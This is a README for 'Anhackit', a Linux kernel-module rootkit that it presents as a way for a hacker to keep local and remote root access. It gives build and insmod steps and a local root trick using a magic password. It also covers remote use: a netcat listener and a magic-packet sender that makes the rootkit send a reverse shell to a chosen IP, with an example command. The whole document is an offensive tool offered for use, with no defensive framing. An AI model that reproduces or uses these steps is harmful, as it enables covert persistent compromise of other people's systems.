# Anhackit - Local & Remote Rootkit for Linux

This is a simple rootkit/kernel module for Linux that
allow hacker to maintain a local and a remote root access.

# Make & install the rootkit

```bash
  git clone https://github.com/anhackin/anhackit
  
  cd anhackit
  
  [edit the conf.h as you want]
  
  make
  
  insmod anhackit.ko
  
  done!
```



# Local use

```bash
  gcc helloworld.c -o helloworld
  
  ./helloworld <magic_password>
  
  Got root!
```



# Remote use

First, create a netcat listening for a reverse shell:

```bash
  nc -lvp <port>
```


Second, send the magic packet to the rootkit:

```bash
  gcc magic_packet_sender.c -o magic_packet_sender
  
  [sudo] ./magic_packet_sender <source_ip> <dest_ip> <dest_port> <payload>
  
  (where <payload> is the rootkit password set in conf.h)
```

Finally, got root on the reverse shell sended to <source_ip> on <dest_port>!

NB: The rootkit send back a reverse shell to the magicpacket's source ip on the destination port.
    For example if you send the magic packet like this:
    
```bash
  [sudo] ./magic_packet_sender 109.89.103.38 172.217.20.78 8888 anhackin
```


You will get back a reverse shell on 109.89.103.38:8888
